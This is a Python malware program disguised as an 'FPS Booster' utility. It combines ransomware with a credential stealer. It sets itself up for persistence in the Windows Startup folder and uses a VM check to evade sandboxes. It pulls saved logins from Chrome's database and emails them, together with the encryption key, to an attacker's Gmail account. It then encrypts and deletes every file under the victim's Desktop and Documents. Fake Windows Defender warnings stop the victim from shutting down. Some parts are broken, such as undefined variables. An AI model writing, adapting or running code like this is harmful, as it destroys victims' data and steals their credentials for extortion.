from getpass import getuser
import os
import platform
from tkinter import *  # Python 3
from tkinter import messagebox
import tkinter.ttk
from psutil import virtual_memory, disk_usage
from cryptography.fernet import Fernet
from time import sleep,time
from shutil import copyfile
import ssl
import pyautogui
from smtplib import SMTP
from sqlite3 import connect
from logging import basicConfig, INFO, shutdown, info
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# =====SETTINGS====== #

Copyloc = fr"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
logname = "user.log"

# == MAIL == #

reciver_email = "123@gmail.com"         # Email who send the email
sender_email = "123@gmail.com"        # Email who get the email
passwordsender = "123"             # go to the Google account , go to the settings, now security and press create an app password... [GOOD LUCK ✔]

# == Sections == #

encryptfiles = True
sendPASSWORD = True
window = True
checkifvm = True
deletelog = True

# =====SETTINGS====== #

basicConfig(filename=logname, level=INFO)
fileplace = os.path.basename(__file__).replace(".py",".exe")




class Encryptor():

    def key_create(self):
        key = Fernet.generate_key()
        return key.decode("utf-8")

    def key_load(self, key_name):
        with open(key_name, 'rb') as mykey:
            key = mykey.read()
        return key

    def file_encrypt(self, key, original_file, encrypted_file):
        f = Fernet(key)

        with open(original_file, 'rb') as file:
            original = file.read()

        encrypted = f.encrypt(original)

        with open(encrypted_file, 'wb') as file:
            file.write(encrypted)

    def file_decrypt(self, key, encrypted_file, decrypted_file):
        f = Fernet(key)

        with open(encrypted_file, 'rb') as file:
            encrypted = file.read()

        decrypted = f.decrypt(encrypted)

        with open(decrypted_file, 'wb') as file:
            file.write(decrypted)


encryptor = Encryptor()  # define

mykey = encryptor.key_create()

def sendmail(reciver_email,sender_email,passwordsender):
    global connection
    try:
        connection = connect(fr"C:\Users\{getuser()}\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    except:
        print("File wasn´t found")
    cursor = connection.cursor()


    cursor.execute("SELECT username_value FROM 'logins' LIMIT 0,30")

    emails = cursor.fetchall()
    email = ""
    a = 0
    for email in emails:
        email = str(email)
        info(f"| NUMBER {a} | Username : {email}")
        a = a + 1
    cursor = ""
    cursor = connection.cursor()
    cursor.execute("SELECT password_value FROM 'logins' LIMIT 0,30")

    pwds = cursor.fetchall()
    a = 0
    for pwd in pwds:
        pwd = str(pwd)
        info(f"| NUMBER {a} | Password : {pwd} ")
        a = a + 1
    info(f"THE KEY : {mykey}")

    shutdown()
    message = MIMEMultipart()
    message["From"] = sender_email
    message['To'] = reciver_email
    message['Subject'] = f"Here We go"
    file = logname
    attachment = open(file,'rb')
    obj = MIMEBase('application','octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition',"attachment; filename= "+file)
    message.attach(obj)
    my_message = message.as_string()
    email_session = SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(sender_email,passwordsender)
    email_session.sendmail(sender_email,reciver_email,my_message)
    email_session.quit()
    print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")

fileplaces = str().join(fileplace)
print("File : ",fileplaces.replace("\\","/"))
try:
    copyfile(fileplaces.replace("\\","/"), Copyloc)
except PermissionError:
    print("Permission Error")
except OSError:
    print("File don´t excist")

isvm = ""
"""""

"""""


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def check_for_vm():
    filesindec1 = 0
    filesindoc1 = 0
    filesindpro = 0
    filesindpro86x = 0
    print("-" * 31, "System Information", "-" * 30)
    uname = platform.uname()
    print(f"System       : {uname.system}")
    print(f"Node Name    : {uname.node}")
    print(f"Release      : {uname.release}")
    print(f"Version      : {uname.version}")
    print(f"Machine      : {uname.machine}")
    print(f"Processor    : {uname.processor}")
    if os.cpu_count() >= 1:
        print(f"Cores        : {os.cpu_count()}")
        if platform.system() == "Windows":
            mem = virtual_memory()
            print("-"*39,"RAM","-"*38,"\nRam space    : ", get_size(mem.total), "\nUsed         : ",get_size(mem.used), "\nFree         : ", get_size(mem.free))
            if mem.total >= 3400000000:
                print("-"*38,"DISK","-"*38)
                print("Disk space   : ", get_size(disk_usage("C:/").total), "\nUsed         : ", get_size(
                    disk_usage("C:/").used), "\nFree         : ", get_size(disk_usage("C:/").free))
                if disk_usage("C:/").total >= 90000000000:
                    for files in os.walk(fr"C:/Users/{getuser()}/Desktop"):
                        filesindec1 = filesindec1 + 1
                    for files in os.walk(fr"C:/Users/{getuser()}/Documents"):
                        filesindoc1 = filesindoc1 + 1
                    for files in os.walk(fr"C:/Program Files (x86)"):
                        filesindpro86x = filesindpro86x + 1
                    for files in os.walk(fr"C:/Program Files"):
                        filesindpro = filesindpro + 1
                    print("On Desktop   : ", filesindec1,"files")
                    print("In Documents : ", filesindoc1,"files")
                    print("Programm     : ", filesindpro,"files")
                    print("Programm(x86): ", filesindpro86x,"files")
                    print("-"*33,"Checking Client","-"*32)
                    print(f"Enough Space...       [{get_size(disk_usage('C:/').total)}]")
                    if filesindec1 >= 100:
                        print(f"Enough Files...       [{filesindec1}]")
                        if filesindoc1 >= 100:
                            print(f"Enough Documents...   [{filesindoc1}] ")
                            print(f"Enough Ram...         [{get_size(mem.total)}]")
                            return False
                        else:
                            return True
                    else:
                        return True
                else:
                    return True
            else:
                return True
        else:
            return True
    else:
        return True



    print(filetime)
    finished = True
    return filetime,finished

def mail():
    sendmail(reciver_email,sender_email,passwordsender)

def List(pathdirs):
  filetime = 0
  list_of_files = list()
  for path in pathdirs:
      for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith((".hehe",".ini",fileself,logname)):
              pass
            else:
              list_of_files.append(os.path.join(root, file))
              filetime = filetime + 1
  print(filetime)
  return list_of_files
def encryptall():
  from cryptography.fernet import Fernet

  ######################

  file_name = ""
  filenames = '{}'

  ######################
  def split_list(alist, wanted_parts):
    length = len(alist)
    return [alist[i * length // wanted_parts: (i + 1) * length // wanted_parts]
            for i in range(wanted_parts)]

  def newline():
    print("\n" * 1000)

  encryptor = Encryptor()  # define

  loaded_key = mykey  # load key
  a = "0"

  def decrypt(file, key):
    ab = file + ".hehe"
    abb = str().join(ab)
    encryptor.file_decrypt(key, abb, file)  # decrypt

  filetime = 0

  def encrypt0():
    for name in l1:
      print("in L1  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt1():
    for name in l2:
      print("in L2  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt2():
    for name in l3:
      print("in L3  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt3():
    for name in l4:
      print("in L4  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt4():
    for name in l5:
      print("in L5  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt5():
    for name in l6:
      print("in L6  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt6():
    for name in l7:
      print("in L7  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  def encrypt7():
    for name in l8:
      print("in L8  | Encrypted :", name)
      ab = name + ".hehe"
      abb = str().join(ab)
      encryptor.file_encrypt(loaded_key, name, abb)  # encrypt
      os.remove(name)

  list_of_files = List(pathdirs)
  l1, l2, l3, l4, l5, l6, l7, l8 = split_list(list_of_files, wanted_parts=8)
  print(l1, l2, l3, l4, l5, l6, l7, l8)


  if __name__ == '__main__':
    Thread(target=encrypt0).start()
    Thread(target=encrypt1).start()
    Thread(target=encrypt2).start()
    Thread(target=encrypt3).start()
    Thread(target=encrypt4).start()
    Thread(target=encrypt5).start()
    Thread(target=encrypt6).start()
    Thread(target=encrypt7).start()

def message():
    counter = 0
    for i in range(0, 500):
        counter += 1
        messagebox.showwarning("Windows", "Your data is getting repaired DON\'T SHUT DOWN!")
        if counter == 100:
            messagebox.showwarning("Windows", "Don´t DO THAT!")
        if counter == 200:
            messagebox.showwarning("Windows", "Don´t DO THAT!")
        if counter == 300:
            messagebox.showwarning("Windows", "Don´t DO THAT!")
        if counter == 400:
            messagebox.showwarning("Windows", "Don´t DO THAT!")
        if counter == 500:
            messagebox.showwarning("Windows", "Don´t DO THAT!")
def main():

    root = Tk()
    root.geometry("260x140")
    ft = Frame()
    fb = Frame()

    ft.pack()

    pb_hd = tkinter.ttk.Progressbar(ft, orient='horizontal', mode='indeterminate')

    txt = Label(
        text="FPS Booster is loading..."
    )
    pb_hd.pack(side=TOP, pady=25)

    root.title("FPS Booster 🚀")
    txt.pack(side="top")
    root.iconbitmap(r"C:\Windows\System32\LaunchTM.exe")
    pb_hd.start(5)
    ok = messagebox.askokcancel("FPS Booster 🚀", "This could take some while... \nstill wanna continue?")
    print(ok)
    messagebox.showinfo("FPS Booster 🚀","We check your PC now, please be patient :)")
    pb_hd.stop()
    def changetxt():
        finish = False
        c = 0
        while finish != True:
            c = c + 1
            txt.config(text="Checking your PC now for Junk Data. \n                  Don\'t 🚀Worry🚀")
            sleep(1)
            txt.config(text="Checking your PC now for Junk Data.. \n                 Don\'t 🚀Worry🚀")
            sleep(1)
            txt.config(text="Checking your PC now for Junk Data... \n                Don\'t 🚀Worry🚀")
            sleep(1)
            print("C :",c)
            if c == 10:
                finish = True
        txt.config(text=f"Critical ERROR!\nDONT SHUT DOWN YOUR PC!\n\n")
        messagebox.showwarning("Windows Defender","DON´T SHUT DOWN!")
        txt.configure(foreground="#800606")
        s = tkinter.ttk.Style()
        s.theme_use('clam')
        TROUGH_COLOR = ""
        BAR_COLOR = "#800606"
        a = 0
        Thread(target=message).start()

        s.configure("adapta",troughcolor=TROUGH_COLOR, bordercolor=TROUGH_COLOR, background=BAR_COLOR, lightcolor=BAR_COLOR, darkcolor=BAR_COLOR)
        print(ok)
    if ok == True:
        root.geometry("260x140")
        txt.config(text="Checking your PC now for Junk Data... \n                        Don\'t Worry")
        Thread(target=changetxt).start()
        pb_hd.start(50)
    if ok == False:
        root.destroy()
        root.quit()
    root.mainloop()


def removelog():
    try:
        os.remove(logname)
    except:
        sleep(1)
        removelog()
        print("still used")
    finally:
        print("Succesfully Deleted the log")


if __name__ == '__main__':
    from threading import Thread

    if checkifvm == True:
        istrue = check_for_vm()
        if istrue == False:
            if window == True:
                Thread(target=main).start()
            if sendPASSWORD == True:
                Thread(target=mail).start()
            if deletelog == True:
                Thread(target=removelog).start()
            if encryptfiles == True:
                pathdirs = list()
                pathdirs.append(fr"C:/Users/{getuser()}/Desktop")
                pathdirs.append(fr"C:/Users/{getuser()}/Documents")
                print(pathdirs)
                encryptall()
                print(time() - starttime)
    else:
        if window == True:
            Thread(target=main).start()
        if sendPASSWORD == True:
            Thread(target=mail).start()
        if deletelog == True:
            Thread(target=removelog).start()
        if encryptfiles == True:
            pathdirs = list()
            pathdirs.append(fr"C:/Users/{getuser()}/Desktop")
            pathdirs.append(fr"C:/Users/{getuser()}/Documents")
            print(pathdirs)
            encryptall()
            print(time() - starttime)
